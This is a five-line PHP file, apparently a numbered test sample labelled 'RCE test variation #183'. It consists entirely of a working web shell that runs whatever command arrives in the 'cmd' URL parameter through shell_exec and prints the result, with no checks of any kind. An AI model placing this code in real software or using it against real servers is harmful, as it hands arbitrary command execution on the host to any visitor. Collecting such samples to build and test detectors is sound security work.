<?php
// RCE test variation #183
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>